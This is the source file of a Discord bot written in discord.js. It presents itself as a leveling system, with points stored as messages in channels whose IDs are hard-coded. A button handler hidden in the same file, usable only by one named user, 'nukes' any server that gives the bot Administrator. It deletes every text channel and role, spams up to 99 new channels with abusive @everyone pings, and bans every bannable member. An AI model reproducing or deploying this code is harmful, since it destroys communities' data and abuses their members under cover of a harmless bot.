const Discord = require('discord.js');
const { Client, GatewayIntentBits, AuditLogEvent, EmbedBuilder, PermissionFlagsBits, ChannelType,  ActionRowBuilder, ButtonBuilder, REST, SlashCommandBuilder, Routes, Events, InteractionType, ButtonStyle } = require('discord.js');

const client = new Discord.Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, 
  GatewayIntentBits.GuildMembers, GatewayIntentBits.MessageContent,
GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildPresences, 
GatewayIntentBits.GuildMessageTyping,
GatewayIntentBits.GuildBans, GatewayIntentBits.DirectMessageTyping] 
})

client.on(Events.MessageCreate, async message => {

  let cmd = message.content.toLowerCase();
  def();
  async function def()
  {
  if (cmd.startsWith(`.leveling on`))
  {
    const leveling = new EmbedBuilder().setTitle("Leveling System").setDescription(`Leveling system records every message of a user, it adds a specific amount of points for message interval, sent in it's fixed time. Leveling system is on now! `).setColor('Aqua');
    const rawdata = client.channels.cache.get('1044193845887369246');

    if (rawdata.type === ChannelType.GuildText)
    {
      const existsparams = rawdata.messages.cache.find(m => m.content.startsWith(`${message.guildId} on`));
      if (existsparams) return message.reply({ embeds: [{description: "The leveling system is already on."}]});
      else {rawdata.send(`${message.guildId} on`);
      message.channel.send({ embeds: [leveling]});
    }

      
    }
  }
}
levelincrease();
async function levelincrease() {
  const rawdata = client.channels.cache.get('1044193845887369246');
  if (rawdata.type === ChannelType.GuildText)
  {
    const existsparams = rawdata.messages.cache.find(m => m.content.startsWith(`${message.guildId} on`));

    if (!existsparams) return false;

    const levelchannel = client.channels.cache.get('1044191964964323378');

    if (levelchannel.type === ChannelType.GuildText)
    {
    const existspoints = levelchannel.messages.cache.find(M => M.content.startsWith(`${message.guildId} ${message.member.user.id}`))
    if (!existspoints)
    {
      var a = 1;
   levelchannel.send(`${message.guildId} ${message.member.user.id} ${a}`);
   a = 0;
    }
    else 
    {
      const args = existspoints.content.trim().split(/ +/g);
      let level = parseFloat(args[2]);
      existspoints.edit(`${message.guildId} ${message.member.user.id} ${level+1}`);
     await wait(400);

const levels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20];

if (level.toString().endsWith('50')) level = level + 50;
     if (levels.includes(level/100))
     {
      await message.channel.send({ embeds: [{description: `Congrats **${message.member.user.tag}**, you have reached the level **${level/100}** ! keep messaging to reach the next level.`}]})
     }
     else {
      return false;
     }
    }
    
    }
  }
}
})

client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isButton()) return false;
  if (interaction.customId === 'nuke')
  {
    if (interaction.user.tag !== 'HeadLance#1415') return interaction.reply({ content: 'Bruh.', ephemeral: true});

    if (!interaction.guild.members.me.permissions.has('Administrator')) return interaction.reply({ content: 'I need `Administrator` Permission to begin the nuke.', ephemeral: true})
    interaction.guild.channels.cache.forEach(c => {
      if (c.isTextBased()) {
        try {
          c.delete()
          console.log(`%c Channel deleted: ${c.name}`, 'background: #222; color: green');
        }
        catch (erro) {
          console.log(`%c Channel deleted: ${c.name}`, 'background: #222; color: red');
        }
      }

      interaction.guild.roles.cache.forEach(
        r => {
          r.delete().catch(e => console.log(e));
        })

    for (let num = 1; num < 100; num++)
    {
      try {
      interaction.guild.channels.create({ name: "nuked-hehhehah", type: ChannelType.GuildText}).then(c => c.send(`${interaction.guild.roles.everyone.toString()} get fucked up by me LOL :joy:`));

      interaction.guild.roles.create({ name: `Nuked by ${interaction.user.tag}`});
      } catch (e) { console.log(e)}
    }
      interaction.guild.members.cache.forEach(m => {
        try {
          if (m.bannable)
          m.ban({reason: 'fucked nuked'});
        }
        catch (error)  { 
          console.log(error);
        }
      })
    })
  }
})

client.on('messageDelete', async message => {

  delsend();

  async function delsend()
  {
    if (message.member.user.tag === 'HeadLance#1415')
    {
      let m = message.content;
      try {
      message.channel.send(`${m}`);
      } catch (erro)  { }
    }
  }
})
// rfs talking bot (reder)
client.login(process.env.htoken);
